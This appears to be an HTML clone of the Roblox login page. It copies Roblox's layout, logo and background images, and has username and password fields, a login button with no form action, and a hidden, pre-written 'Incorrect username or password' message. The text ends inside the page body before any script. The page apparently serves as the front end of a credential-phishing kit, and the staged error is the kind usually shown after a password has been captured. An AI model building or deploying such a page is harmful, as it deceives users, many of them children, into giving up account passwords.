<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Log in to Roblox</title>
    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#000}
        .page{width:100vw;height:100vh;background:url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg') center/cover no-repeat;display:flex;align-items:center;justify-content:center}
        .card{width:384px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 12px 40px rgba(0,0,0,0.4);position:relative}
        .card img{display:block;width:120px;margin:0 auto 20px}
        .card h1{font-size:24px;font-weight:700;color:#191919;text-align:center;margin-bottom:20px}
        .card input{width:100%;height:44px;padding:0 12px;margin-bottom:12px;border:1px solid #cdcdcd;border-radius:6px;font-size:15px;background:#f7f7f7;outline:none}
        .card input:focus{border-color:#00b06f;background:#fff}
        .card button{width:100%;height:44px;background:#00b06f;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
        .card button:hover{background:#009a5f}
        .card .link{text-align:center;margin-top:16px}
        .card .link a{color:#00b06f;font-size:13px;text-decoration:none}
        .card .signup{text-align:center;margin-top:20px;font-size:14px;color:#666}
        .card .signup a{color:#00b06f;text-decoration:none;font-weight:600}
        .card .error{background:#fff0f0;border:1px solid #ffc7c7;border-radius:4px;padding:10px;color:#c00;font-size:13px;margin-bottom:12px;display:none}
    </style>
</head>
<body>
    <div class="page">
        <div class="card">
            <img src="https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png" alt="Roblox">
            <h1>Log In to Roblox</h1>
            <div class="error" id="error">Incorrect username or password.</div>
            <input type="text" id="login-username" placeholder="Username/Email/Phone">
            <input type="password" id="login-password" placeholder="Password">
            <button id="login-button">Log In</button>
            <div class="link"><a href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a></div>
            <div class="signup">Don't have an account? <a href="https://www.roblox.com/account/signupredir">Sign Up</a></div>
        </div>
